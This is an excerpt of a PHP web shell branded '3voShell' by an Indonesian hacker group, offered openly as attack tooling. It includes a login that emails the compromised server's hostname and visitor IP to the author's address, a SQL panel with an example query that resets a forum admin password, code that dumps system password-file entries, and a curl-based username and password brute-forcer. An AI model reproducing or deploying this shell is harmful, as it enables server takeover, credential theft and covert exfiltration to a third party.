...
if($admin['check']) {
	if ($doing == 'login') {
		if ($admin['pass'] == $password) {
			scookie('alxpass', $password);

// Function mail Sender to my Email - Please remove this before you using this shell code, Thanks - Fernando - ALxTeam
$time_shell = "".date("d/m/Y - H:i:s")."";
$ip_remote = $_SERVER["REMOTE_ADDR"];
$from_shellcode = 'shell@'.gethostbyname($_SERVER['SERVER_NAME']).'';
$to_email = 'alx.wahid@gmail.com';
...
<BR><BR><div align=center><font color=yellow face=tahoma size=2>Hi Master! Wellcomeback  - Please wait...<BR><img src=https://3.bp.blogspot.com/-IpTodLWXERw/XK9YWZO_uvI/AAAAAAAAAvU/LGK0j91Ypl4f74ITUZr6yvushK3xcxM_wCLcBGAs/s1600/black-hatter%2B%25281%2529.jpg></div>');
			exit;
		}
...
<title><?php echo str_replace('.','','<=[  Wahid - 3voShell ]=>');?></title>
<style type="text/css">
...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head_small">
		<td  width=100%>
		<table width=100%><tr class="head_small"><td  width=86px><a title="VN hacker" href="<?php $self;?>"><img src=https://hsto.org/getpro/geektimes/post_images/f69/378/358/f6937835845ec875e81ac92103be8a1b.png height=86 border=0></a></td><td>
		<span style="float:left;"> <?php echo "Hostname: ".$_SERVER['HTTP_HOST']."";?>  | <a href="https://www.facebook.com/405.phtml" target="_blank"><?php echo str_replace('.','','<=[  Wahid - Indonesia Single Attacker ]=>');?> </a> | <a href="javascript:goaction('logout');"><font color=red>Logout</font></a></span> <br />
...
<?php
	...
	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
		...
		if ($dbname) {
			...
			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database <font color=red><b>'.$dbname.'</font></b>:<BR>Example VBB Password: <font color=red>alxteam</font><BR><font color=yellow>UPDATE `user` SET `password` = \'69e53e5ab9536e55d31ff533aefc4fbe\', salt = \'p5T\' WHERE `userid` = \'1\' </font>
...
while ($i < 60000) {
    ...
    if (!empty($line)) {
        ...
        while (list ($key, $alx_etcpwd) = each($line)){
            echo "".$alx_etcpwd."\n";
            break;
        }
...
p("<b>[ alx.wahid@gmail.com ]# </b><b>Attacking has been done!</a> Username: <font color='#FF0000'> $user </font> / Password:<font color='#FF0000'> $pass </font></b><br>");}curl_close($ch);}

if(isset($submit) && !empty($submit)){

$userlist = explode ("\n" , $users );
$passlist = explode ("\n" , $pass );
p('<b>[ alx.wahid@gmail.com ]# Attacking ...</font></b><br>');
...
<div style="padding:10px;border-bottom:1px solid #0E0E0E;border-top:1px solid #0E0E0E;background:#0E0E0E;">
	...
	Copyright (C) 2008-2018 <B></B> - Develop by <a href=https://alxwahid.blogspot.com target=_blank><B>Wahid-ALx   </B></a> - <B>-  UnderGround</B> All Rights Reserved.
</div>
</body>
</noscript>
